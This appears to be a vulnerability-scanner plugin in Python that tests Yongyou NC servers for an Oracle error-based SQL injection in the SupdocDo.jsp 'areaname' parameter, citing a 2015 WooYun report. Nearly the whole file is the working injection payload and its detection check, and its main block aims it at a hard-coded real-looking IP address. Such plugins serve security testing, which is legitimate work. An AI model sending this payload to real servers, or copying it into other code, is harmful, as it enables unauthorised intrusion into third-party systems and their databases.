#/usr/bin/python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2015-0124173
#__Author__ = Magic
#_PlugName_ = yongyou_sql Plugin
#_FileName_ = yongyou_sql.py

def assign(service, arg):
    if service == "yongyou_nc":
        return True, arg 	

def audit(arg):
    payload = "epp/html/nodes/upload/SupdocDo.jsp?areaname=areaname=1%27%20AND%202538=%28SELECT%20UPPER%28XMLType%28CHR%2860%29||CHR%2858%29||CHR%28113%29||CHR%28118%29||CHR%2898%29||CHR%28112%29||CHR%28113%29||%28SELECT%20%28CASE%20WHEN%20%282538=2538%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29||CHR%28113%29||CHR%28112%29||CHR%28112%29||CHR%28106%29||CHR%28113%29||CHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27iLAM%27=%27iLAM&supdocname=1&pk_singleplan=1" 
    url = arg + payload
    code, head, res, errcode, final_url = curl.curl2(url)
    if code == 500 and 'qvbpq1qppjq' in res:
        security_hole(url)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_nc', 'http://221.237.157.190/')[1])